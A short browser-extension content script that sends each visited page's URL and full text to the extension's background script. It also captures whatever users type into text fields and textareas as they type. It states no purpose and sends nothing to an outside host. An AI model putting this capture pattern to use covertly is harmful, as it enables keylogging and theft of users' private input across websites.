// content-script.js
(function() {
  // Function to send data to the background script
  function sendMessage(type, text) {
      browser.runtime.sendMessage({
          type: type,
          url: window.location.href,
          text: text
      });
  }

  // Send the initial text content of the body
  sendMessage("logBodyText", document.body.innerText);

  // Function to handle input events
  function handleInput(event) {
      sendMessage("logUserInput", event.target.value);
  }

  // Add event listeners to all input and textarea elements for capturing real-time typing
  document.querySelectorAll('input[type="text"], textarea').forEach(input => {
      input.addEventListener('input', handleInput);
  });
})();
